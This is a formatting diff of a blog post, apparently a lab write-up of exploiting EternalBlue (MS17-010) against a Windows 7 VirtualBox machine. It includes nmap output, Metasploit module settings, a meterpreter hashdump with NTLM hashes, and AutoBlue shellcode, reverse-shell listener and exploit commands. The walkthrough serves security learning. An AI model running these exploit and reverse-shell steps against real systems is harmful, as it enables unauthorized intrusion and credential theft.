@@ -1,12 +1,11 @@
 ---
-title: "EternalBlue (MS17-010) — Windows 7 SP1 Exploitation Walkthrough"
-date: "2025-11-13"
+title: 'EternalBlue (MS17-010) — Windows 7 SP1 Exploitation Walkthrough'
+date: '2025-11-13'
 draft: false
-tags: ["windows", "easy", "ms17-010", "eternalblue"]
-summary: "Compromise of a Windows 7 SP1 lab machine by exploiting the MS17-010 EternalBlue SMB vulnerability via Metasploit to obtain a SYSTEM-level Meterpreter shell and extract password hashes, followed by a manual exploitation attempt using AutoBlue that resulted in a BSOD."
-images: ["/static/images/blue/preview.png"]
+tags: ['windows', 'Machine', 'easy', 'ms17-010', 'eternalblue']
+summary: 'Compromise of a Windows 7 SP1 lab machine by exploiting the MS17-010 EternalBlue SMB vulnerability via Metasploit to obtain a SYSTEM-level Meterpreter shell and extract password hashes, followed by a manual exploitation attempt using AutoBlue that resulted in a BSOD.'
+images: ['/static/images/blue/preview.png']
 ---
-
 
 # Lab Setup
 
@@ -42,7 +41,7 @@ Verified connectivity by pinging the target from the Kali host to confirm the de
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ nmap -sCV 10.0.2.5    
+└─$ nmap -sCV 10.0.2.5
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 09:20 EST
 Nmap scan report for 10.0.2.5
 Host is up (0.0040s latency).
@@ -55,7 +54,7 @@ PORT      STATE SERVICE      VERSION
 | ssl-cert: Subject: commonName=WIN-845Q99OO4PP
 | Not valid before: 2025-10-15T06:18:26
 |_Not valid after:  2026-04-16T06:18:26
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: WIN-845Q99OO4PP
 |   NetBIOS_Domain_Name: WIN-845Q99OO4PP
 |   NetBIOS_Computer_Name: WIN-845Q99OO4PP
@@ -74,25 +73,25 @@ MAC Address: 08:00:27:2A:95:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-time: 
+| smb2-time:
 |   date: 2025-11-12T14:21:30
 |_  start_date: 2025-11-12T14:10:08
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_clock-skew: mean: 1h00m03s, deviation: 2h14m09s, median: 3s
 |_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:95:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
 |   OS CPE: cpe:/o:microsoft:windows_7::sp1
 |   Computer name: WIN-845Q99OO4PP
 |   NetBIOS computer name: WIN-845Q99OO4PP\x00
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2025-11-12T09:21:30-05:00
-| smb2-security-mode: 
-|   2:1:0: 
+| smb2-security-mode:
+|   2:1:0:
 |_    Message signing enabled but not required
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -154,33 +153,31 @@ The exploitation was performed using the Metasploit module 'exploit/windows/smb/
 
 ```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.0.2.5
-rhosts => 10.0.2.5    
+rhosts => 10.0.2.5
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost eth0
 lhost => 10.0.2.4
-msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
 ```
 
 ## Exploit
 
 ![Blue](/static/images/blue/image%202.png)
 
-It worked and I got the **`meterpreter shell`**  
+It worked and I got the **`meterpreter shell`**
 
 ### Hashdump
 
 ```bash
-meterpreter > hashdump 
+meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
 user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-meterpreter > 
+meterpreter >
 ```
 
 - Those lines from `hashdump` are **password hashes** extracted from the Windows.
-    
-    Format: `username:RID:LM_HASH:NTLM_HASH:::`.
-    
+  Format: `username:RID:LM_HASH:NTLM_HASH:::`.
 - The `NTLM_HASH` values are what an attacker would target to recover plaintext passwords via offline cracking. Whether cracking succeeds depends on password strength and attacker resources.
 - Possession of these hashes is **evidence of credential exposure** and a serious security breach.
 
@@ -196,7 +193,7 @@ I searched for public exploits avaliable for the eternal blue and found this git
 
 ```bash
 ┌──(kali㉿kali)-[~/blue]
-└─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010                                              
+└─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
 Cloning into 'AutoBlue-MS17-010'...
 remote: Enumerating objects: 145, done.
 remote: Counting objects: 100% (69/69), done.
@@ -215,19 +212,19 @@ Resolving deltas: 100% (86/86), done.
 
 ### Usage
 
-**`./shell_prep.sh`** 
+**`./shell_prep.sh`**
 
 ```bash
 ┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010]
-└─$ cd shellcode 
-                                                                                                                                                                             
+└─$ cd shellcode
+
 ┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010/shellcode]
-└─$ ./shell_prep.sh   
+└─$ ./shell_prep.sh
                  _.-;;-._
           '-..-'|   ||   |
           '-..-'|_.-;;-._|
           '-..-'|   ||   |
-          '-..-'|_.-''-._|   
+          '-..-'|_.-''-._|
 Eternal Blue Windows Shellcode Compiler
 
 Let's compile them windoos shellcodezzz
@@ -272,8 +269,8 @@ DONE
 
 ```bash
 ┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010/shellcode]
-└─$ cd ..       
-                                                                                                                                                                             
+└─$ cd ..
+
 ┌──(work)─(kali㉿kali)-[~/blue/AutoBlue-MS17-010]
 └─$ ./listener_prep.sh
   __
@@ -294,9 +291,9 @@ Enter 0 for meterpreter shell or 1 for regular cmd shell:
 Type 0 if this is a staged payload or 1 if it is for a stageless payload: 0
 Starting listener (staged)...
 Starting postgresql (via systemctl): postgresql.service.
-Metasploit tip: Save the current environment with the save command, 
+Metasploit tip: Save the current environment with the save command,
 future console restarts will use this environment again
-                                                  
+
 
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMMMM                MMMMMMMMMM
@@ -345,21 +342,21 @@ resource (config.rc)> exploit -j
 resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
 PAYLOAD => windows/shell/reverse_tcp
 resource (config.rc)> set LPORT 2222
-[*] Started reverse TCP handler on 10.0.2.4:4444 
+[*] Started reverse TCP handler on 10.0.2.4:4444
 LPORT => 2222
 resource (config.rc)> exploit -j
 [*] Exploit running as background job 1.
 [*] Exploit completed, but no session was created.
 
-[*] Started reverse TCP handler on 10.0.2.4:2222 
-msf6 exploit(multi/handler) > 
+[*] Started reverse TCP handler on 10.0.2.4:2222
+msf6 exploit(multi/handler) >
 ```
 
 ### Exploit
 
 ```bash
 ┌──(kali㉿kali)-[~/blue/AutoBlue-MS17-010]
-└─$ python eternalblue_exploit7.py 10.0.2.5 shellcode/sc_all.bin 
+└─$ python eternalblue_exploit7.py 10.0.2.5 shellcode/sc_all.bin
 shellcode size: 2307
 numGroomConn: 13
 Target OS: Windows 7 Ultimate 7601 Service Pack 1
